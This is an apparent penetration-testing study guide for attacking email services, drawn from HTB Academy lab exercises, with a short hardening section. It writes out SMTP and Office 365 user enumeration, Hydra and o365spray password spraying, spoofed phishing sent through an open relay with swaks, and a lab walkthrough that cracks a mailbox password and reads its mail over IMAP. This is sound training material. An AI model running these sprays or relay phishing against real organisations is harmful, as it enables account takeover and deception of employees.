# 📧 Email Services Attacks (SMTP/IMAP/POP3)

## 🎯 Overview

This document covers **exploitation techniques** against Email Services (SMTP/POP3/IMAP), focusing on practical attack methodologies from HTB Academy's "Attacking Common Services" module. Email attacks can lead to **user enumeration, mail relay abuse, credential harvesting, and email-based social engineering**.

> **"A mail server handles and delivers email over a network, usually over the Internet. Email servers are complex and usually require us to enumerate multiple servers, ports, and services. Most companies today have their email services in the cloud with services such as Microsoft 365 or G-Suite."**

## 🏗️ SMTP Attack Methodology

### Attack Chain Overview
```
Service Discovery → User Enumeration → Mail Relay Testing → Credential Attacks → Social Engineering
```

### Key Attack Objectives
- **User enumeration** via SMTP commands
- **Mail relay abuse** for spam/phishing
- **Credential harvesting** through SMTP authentication
- **Information disclosure** via SMTP banners
- **Social engineering** using email spoofing

---

## 📍 Service Discovery & Enumeration

### MX Record Enumeration

#### HTB Academy MX Record Examples
```bash
# Check MX records to identify mail servers
host -t MX hackthebox.eu
# hackthebox.eu mail is handled by 1 aspmx.l.google.com.

host -t MX microsoft.com
# microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.

# Using dig for detailed MX information
dig mx plaintext.do | grep "MX" | grep -v ";"
# plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
# plaintext.do.           7076    IN      MX      10 mx.zoho.com.
# plaintext.do.           7076    IN      MX      20 mx2.zoho.com.

dig mx inlanefreight.com | grep "MX" | grep -v ";"
# inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.

# Get A record for mail server
host -t A mail1.inlanefreight.htb
# mail1.inlanefreight.htb has address 10.129.14.128
```

#### Cloud vs Custom Mail Servers
```
Cloud Services:
- aspmx.l.google.com (G-Suite)
- microsoft-com.mail.protection.outlook.com (Microsoft 365)
- mx.zoho.com (Zoho)

Custom Mail Servers:
- mail1.inlanefreight.com (Company-hosted)
```

### Email Service Port Enumeration

#### HTB Academy Complete Port List
```bash
# All email-related ports
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

# Expected output
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
```

#### Email Service Ports Reference
```
TCP/25    - SMTP Unencrypted
TCP/143   - IMAP4 Unencrypted  
TCP/110   - POP3 Unencrypted
TCP/465   - SMTP Encrypted
TCP/587   - SMTP Encrypted/STARTTLS
TCP/993   - IMAP4 Encrypted
TCP/995   - POP3 Encrypted
```

### Key Information to Extract
- **Mail server type** (Cloud vs Custom implementation)
- **SMTP server software** (Postfix, Sendmail, Exchange)
- **Version information** for vulnerability research
- **Supported authentication methods**
- **Mail relay configuration**
- **Domain information** from banners

---

## 👥 User Enumeration Attacks

### SMTP User Enumeration Commands

#### VRFY Command (HTB Academy Example)
```bash
# HTB Academy VRFY enumeration
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

VRFY root
252 2.0.0 root

VRFY www-data
252 2.0.0 www-data

VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

#### EXPN Command (HTB Academy Example)
```bash
# HTB Academy EXPN enumeration
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

EXPN john
250 2.1.0 john@inlanefreight.htb

EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

#### RCPT TO Command (HTB Academy Example)
```bash
# HTB Academy RCPT TO enumeration
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

MAIL FROM:test@htb.com
250 2.1.0 test@htb.com... Sender ok

RCPT TO:julio
550 5.1.1 julio... User unknown

RCPT TO:kate
550 5.1.1 kate... User unknown

RCPT TO:john
250 2.1.5 john... Recipient ok
```

#### POP3 User Enumeration (HTB Academy Example)
```bash
# HTB Academy POP3 USER command enumeration
telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio
-ERR

USER john
+OK
```

### HTB Academy User Enumeration Example

#### Using smtp-user-enum Tool (HTB Academy Example)
```bash
# HTB Academy comprehensive enumeration example
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

#### Alternative Enumeration Methods
```bash
# Using different SMTP commands
smtp-user-enum -M VRFY -U users.list -t target_ip
smtp-user-enum -M EXPN -U users.list -t target_ip

# Custom wordlist creation
echo -e "admin\nroot\nuser\ntest\nmail\npostmaster" > custom_users.txt

# Nmap SMTP user enumeration
nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} target_ip
```

---

## ☁️ Cloud Enumeration (Office 365)

### O365spray Tool (HTB Academy Example)

#### Validate Office 365 Domain
```bash
# HTB Academy O365 validation example
python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

#### Office 365 User Enumeration
```bash
# HTB Academy O365 user enumeration
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

### Cloud Service Enumeration Tools
```bash
# Microsoft Office 365
python3 o365spray.py --enum -U users.txt --domain target.com

# Gmail/Google Workspace  
# Use CredKing for Gmail enumeration

# Generic cloud email enumeration
# - Check for common cloud providers in MX records
# - Use service-specific enumeration tools
# - Adapt techniques based on cloud provider
```

---

## 📨 Protocol Specific Attacks

### Open Mail Relay Exploitation

#### Understanding Open Relay
```
Open Relay = SMTP server allowing unauthenticated email relay
Risk: Mail from any source transparently re-routed
Attack Vector: Phishing emails appearing from legitimate server
Masking: Source appears to originate from open relay server
```

#### HTB Academy Open Relay Detection
```bash
# HTB Academy Nmap open relay detection
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

#### HTB Academy Open Relay Exploitation with Swaks
```bash
# HTB Academy phishing email via open relay
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

### Manual Open Relay Testing
```bash
# Manual telnet test for open mail relay
telnet target_ip 25

# Test commands
HELO attacker.com
MAIL FROM: test@external.com
RCPT TO: victim@external.com
DATA
Subject: Test Relay
This is a test for open relay.
.
QUIT

# Response codes:
# 250 = Command successful (relay allowed)
# 550 = Relay denied
```

### Additional Relay Testing Tools
```bash
# Using sendEmail tool
sendEmail -f sender@external.com -t victim@external.com -s target_ip -m "Test message"

# Using msmtp
echo "Test message" | msmtp --host=target_ip --from=test@external.com victim@external.com

# Swaks with authentication testing
swaks --to test@external.com --from test@domain.com --server target_ip --auth-user admin --auth-password password
```

---

## 🔐 Password Attacks

### Traditional Email Service Attacks

#### HTB Academy Hydra Password Spray Example
```bash
# HTB Academy POP3 password spraying
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

#### Additional Hydra Examples
```bash
# SMTP brute force
hydra -l admin -P passwords.txt smtp://target_ip:25

# IMAP password spray
hydra -L users.txt -p 'Spring2024!' imap://target_ip:143

# Multiple protocols
hydra -L users.txt -P passwords.txt target_ip smtp
```

### Cloud Service Password Attacks

#### HTB Academy O365 Password Spraying
```bash
# HTB Academy O365 password spray example
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

### Cloud-Specific Tools
```bash
# Office 365
o365spray --spray -U users.txt -p 'Password123!' --domain target.com

# Gmail/Google Workspace
# CredKing for Gmail enumeration and spraying

# General cloud considerations:
# - Use service-specific tools when available
# - Traditional tools often blocked by cloud providers
# - Keep tools updated due to frequent API changes
```

---

## 🎯 HTB Academy Lab Scenarios

### Scenario 1: SMTP User Enumeration
```bash
# Task: Find available username for domain inlanefreight.htb
# Target: 10.129.203.12

# Step 1: Download users.list from module resources
# Step 2: Use smtp-user-enum with RCPT method
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12

# Result: marlin@inlanefreight.htb exists
# Answer: marlin
```

### Scenario 2: SMTP Relay Testing
```bash
# Test for mail relay capabilities
telnet target_ip 25

# Test relay with external domains
HELO test.com
MAIL FROM: attacker@external.com
RCPT TO: victim@anotherdomain.com

# Check response codes:
# 250 = Relay allowed
# 550 = Relay denied
```

### Scenario 3: Information Gathering
```bash
# Extract domain information from SMTP
telnet target_ip 25
EHLO test.com

# Look for:
# - Server version information
# - Supported extensions
# - Authentication mechanisms
# - Domain names in responses
```

---

## 📋 SMTP Attack Checklist

### Discovery & Enumeration
- [ ] **Port scanning** - TCP/25, 465, 587 detection
- [ ] **Banner grabbing** - Server version identification
- [ ] **EHLO enumeration** - Supported extensions
- [ ] **Authentication methods** - AUTH mechanisms
- [ ] **Domain information** - Mail domain discovery

### User Enumeration
- [ ] **VRFY command** - User verification
- [ ] **EXPN command** - Mailing list expansion  
- [ ] **RCPT TO** - Recipient checking
- [ ] **smtp-user-enum** - Automated enumeration
- [ ] **Nmap scripts** - smtp-enum-users

### Exploitation
- [ ] **Open relay testing** - Mail relay abuse
- [ ] **Authentication attacks** - Credential brute forcing
- [ ] **Email spoofing** - Sender impersonation
- [ ] **Social engineering** - Phishing email crafting
- [ ] **Data exfiltration** - Email-based data theft

### Post-Exploitation
- [ ] **Email harvesting** - Contact information gathering
- [ ] **Persistence** - Email forwarding rules
- [ ] **Lateral movement** - Internal email attacks
- [ ] **Credential harvesting** - Phishing campaigns

---

## 🛡️ Defense & Mitigation

### SMTP Server Hardening
- **Disable VRFY/EXPN** - Prevent user enumeration
- **Configure relay restrictions** - Prevent open relay
- **Implement authentication** - Require SMTP AUTH
- **Rate limiting** - Prevent brute force attacks
- **Banner customization** - Hide version information

### Email Security
- **SPF records** - Sender Policy Framework
- **DKIM signatures** - DomainKeys Identified Mail
- **DMARC policy** - Domain-based Message Authentication
- **TLS encryption** - Secure mail transmission
- **Content filtering** - Malware and spam protection

### Monitoring & Detection
- **Failed authentication logs** - Brute force detection
- **Unusual mail patterns** - Anomaly detection
- **User enumeration attempts** - VRFY/EXPN monitoring
- **Relay abuse detection** - External recipient tracking
- **Rate limiting alerts** - High-volume email detection

---

## 🚀 HTB Academy Lab Scenarios

### Lab Exercise 1: SMTP User Enumeration
```bash
Target: inlanefreight.htb mail server  
Task: Find available username for domain inlanefreight.htb

# HTB Academy Lab Solution:
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

### Scan started at Thu Jun 30 22:02:35 2022 ###
10.129.203.12: marlin@inlanefreight.htb exists
### Scan completed at Thu Jun 30 22:02:42 2022 ###
1 results.

79 queries in 7 seconds (11.3 queries / sec)

# Lab Answer: marlin
```

### Lab Exercise 2: Email Access & Flag Extraction
```bash
Target: marlin@inlanefreight.htb email account
Task: Access email and submit flag content

# Step 1: HTB Academy Password Attack with Hydra
hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.12 -f

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak 

[DATA] attacking smtp://10.129.203.12:25/
[25][smtp] host: 10.129.203.12   login: marlin@inlanefreight.htb   password: poohbear
[STATUS] attack finished for 10.129.203.12 (valid pair found)
1 of 1 target successfully completed, 1 valid password found

# Step 2: HTB Academy IMAP Email Access
telnet 10.129.203.12 143

Trying 10.129.203.12...
Connected to 10.129.203.12.
Escape character is '^]'.
* OK IMAPrev1

11 login "marlin@inlanefreight.htb" "poohbear"
11 OK LOGIN completed

12 select "INBOX"
* 1 EXISTS
* 1 RECENT
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* OK [UIDVALIDITY 1650465305] current uidvalidity
* OK [UIDNEXT 2] next uid
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
12 OK [READ-WRITE] SELECT completed

13 FETCH 1 BODY[]
* 1 FETCH (BODY[] {640}
Return-Path: marlin@inlanefreight.htb
Received: from [10.10.14.33] (Unknown [10.10.14.33])
	by WINSRV02 with ESMTPA
	; Wed, 20 Apr 2022 14:49:32 -0500
Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb
Cc: marlin@inlanefreight.htb
Date: Wed, 20 Apr 2022 15:49:11 -0400
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.38.3-1 
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hi admin,

How can I change my password to something more secure? 

flag: HTB{...}

)
13 OK FETCH completed

# Lab Answer: HTB{...}
```

### Key Lab Learning Points
```
1. SMTP User Enumeration (Lab 1)
   - smtp-user-enum with RCPT method
   - Target specific domain enumeration
   - Wordlist-based username discovery
   - Result: marlin@inlanefreight.htb

2. Multi-Protocol Attack Chain (Lab 2)  
   - SMTP password attack with Hydra
   - IMAP email access (port 143)
   - Full email content extraction
   - Credentials: marlin@inlanefreight.htb:poohbear
   
3. Practical Tool Usage
   - smtp-user-enum for enumeration
   - Hydra for password attacks
   - Telnet for manual IMAP access
   - IMAP commands: LOGIN, SELECT, FETCH

4. Real-World Attack Flow
   - Enumeration → Credential Attack → Email Access
   - Weak password exploitation (rockyou.txt)
   - Email-based intelligence gathering
   - Flag extraction: HTB{...}
```

---

## 🔧 Tools & Resources

### Essential Email Service Tools
```bash
# User enumeration
smtp-user-enum          # VRFY/EXPN/RCPT enumeration
nmap                    # smtp-enum-users script  
telnet/nc              # Manual testing

# Mail testing & relay
swaks                  # SMTP testing and open relay
sendEmail              # Email sending tool
msmtp                  # Mail transfer agent

# Cloud enumeration & attacks
o365spray              # Office 365 enumeration/spraying
credking               # Gmail/Okta attacks
mailsniper             # Office 365 attacks

# Password attacks  
hydra                  # Multi-protocol password attacks
medusa                 # Network login cracker
ncrack                 # Network authentication cracker
```

### Useful Nmap SMTP Scripts
```bash
smtp-commands          # Available SMTP commands
smtp-enum-users        # User enumeration  
smtp-ntlm-info        # NTLM information
smtp-open-relay       # Open relay detection
smtp-strangeport      # Non-standard ports
smtp-vuln-cve2010-4344  # Postfix vulnerability
smtp-vuln-cve2011-1720  # Postfix vulnerability  
smtp-vuln-cve2011-1764  # Exim vulnerability
```

---

## 🔗 Related Techniques

- **[Email Reconnaissance](../services/smtp-enumeration.md)** - Information gathering
- **[Social Engineering](../social-engineering/)** - Email-based attacks
- **[Phishing](../social-engineering/phishing.md)** - Malicious email campaigns
- **[Domain Attacks](dns-attacks.md)** - DNS-based email attacks
- **[Password Attacks](../passwords-attacks/)** - SMTP credential attacks

---

## 📚 References

- **HTB Academy** - Attacking Common Services Module
- **RFC 5321** - Simple Mail Transfer Protocol
- **smtp-user-enum** - SMTP user enumeration tool
- **OWASP Email Security** - Email attack vectors
- **Postfix Documentation** - SMTP server configuration

---

*This document provides comprehensive SMTP attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 